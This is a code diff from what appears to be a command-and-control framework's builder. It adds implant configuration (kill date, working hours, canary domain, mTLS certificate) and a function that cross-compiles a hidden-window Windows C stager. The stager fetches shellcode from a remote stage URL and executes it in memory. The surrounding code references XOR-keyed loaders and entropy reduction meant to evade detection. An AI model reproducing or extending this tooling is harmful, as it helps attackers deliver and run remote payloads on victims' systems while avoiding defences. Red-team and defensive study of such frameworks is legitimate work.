@@ -481,10 +481,17 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 		"AGENT_KILL_DATE="+cfg.KillDate,
 		"AGENT_SMB_PIPE="+cfg.SMBPipe,
 		"AGENT_BEACON_URIS="+cfg.BeaconURIs,
+		"AGENT_WORKING_HOURS="+cfg.WorkingHours,
+		"AGENT_CANARY_DOMAIN="+cfg.CanaryDomain,
 		"CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER="+cc,
 	)
 	if cfg.UserAgent != "" {
 		rustEnv = append(rustEnv, "AGENT_USER_AGENT="+cfg.UserAgent)
+	}
+	if cfg.Transport == "mtls" && cfg.AgentCertPEM != "" && cfg.AgentKeyPEM != "" {
+		if pfxB64, err := pemToPFXBase64(cfg.AgentCertPEM, cfg.AgentKeyPEM); err == nil {
+			rustEnv = append(rustEnv, "AGENT_PFX="+pfxB64)
+		}
 	}
 
 	buildDir := filepath.Join(agentDir, "target", "x86_64-pc-windows-gnu", "release")
@@ -915,6 +922,43 @@ func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string
 	}
 	if cfg.EntropyReduce {
 		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
+// BuildCStager cross-compiles the minimal C stager for Windows x64.
+// stageURL is the full URL of the stage endpoint serving raw shellcode.
+// The stager fetches the shellcode over WinHTTP and executes it in-memory.
+func BuildCStager(stageURL, outDir string) (string, error) {
+	cc := "x86_64-w64-mingw32-gcc"
+	if _, err := exec.LookPath(cc); err != nil {
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
+	}
+
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	srcPath := filepath.Join(root, "agents", "stager-c", "stager.c")
+	if _, err := os.Stat(srcPath); err != nil {
+		return "", fmt.Errorf("stager.c not found at %s", srcPath)
+	}
+
+	outPath := filepath.Join(outDir, "stager_c_amd64.exe")
+	args := []string{
+		"-mwindows", "-Os", "-s",
+		"-fno-stack-protector", "-fno-ident",
+		fmt.Sprintf("-DSTAGE_URL=%q", stageURL),
+		"-o", outPath,
+		srcPath,
+		"-lwinhttp", "-lkernel32",
+	}
+	cmd := exec.Command(cc, args...)
+	cmd.Dir = root
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("stager build failed: %v\n%s", err, out)
 	}
 	return outPath, nil
 }
